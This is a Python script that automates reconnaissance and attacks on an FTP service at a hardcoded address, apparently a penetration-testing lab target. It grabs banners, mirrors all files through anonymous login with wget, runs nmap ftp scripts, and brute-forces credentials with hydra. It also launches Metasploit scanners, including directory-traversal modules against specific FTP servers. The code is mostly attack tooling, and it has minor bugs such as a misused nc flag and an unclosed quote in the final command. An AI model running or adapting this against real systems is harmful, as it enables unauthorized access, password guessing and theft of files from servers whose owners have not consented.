import os
from re import sub
import subprocess


IP = f"10.10.14.5"
PORT = f"21"


def grabBanner(IP, PORT="21"):
    os.system(f"telnet -n {IP} {PORT}")
    

def grabCert(IP, PORT="21"):
    print("Attempting to Grab the Banner")
    os.system(f"nc -vp {IP} {PORT}")
    os.system(f"openssl s_client -connect {IP}:{PORT} -startls ftp")

def downloadAllFiles(IP, PORT="21"):
    print("Attempting to Download all files")
    os.system(f"wget -m ftp://anonymous:anonymous@{IP}")

def downloadAllFilesNoPassive(IP, PORT="21"):
    print("Attempting to Download all files")
    os.system(f"wget -m --no-passive ftp://anonymous:anonymous@{IP}")

def nmapFtp(IP, PORT="21"):
    os.system(f"nmap --script ftp-* -p {PORT} {IP}")

def HydraBruteForce(IP, user, passlistpath, PORT="21"):
    os.system(f"hydra -t 1 -l {user} -P {passlistpath} -vV {IP} ftp") 

def msfenumeration(IP, PORT = 21):
    print("Running FTP-Anonymous")
    os.system(f'msfconsole -q -x "use auxiliary/scanner/ftp/anonymous; set RHOSTS {IP}; set RPORT 21; run; exit" ')
    print("Running Ftp_version")
    os.system(f'msfconsole -q -x "use auxiliary/scanner/ftp/ftp_version; set RHOSTS {IP}; set RPORT 21; run; exit"')
    print("Running Bison_ftp_traversal")
    os.system(f'msfconsole -q -x "use auxiliary/scanner/ftp/bison_ftp_traversal; set RHOSTS {IP}; set RPORT 21; run; exit"')
    print("Running Colorado_ftp_traversal")
    os.system(f'msfconsole -q -x "use auxiliary/scanner/ftp/colorado_ftp_traversal; set RHOSTS {IP}; set RPORT 21; run; exit"')
    print("Running Titanftp_xcrc_traversal")
    os.system(f'msfconsole -q -x "use auxiliary/scanner/ftp/titanftp_xcrc_traversal; set RHOSTS {IP}; set RPORT 21; run; exit')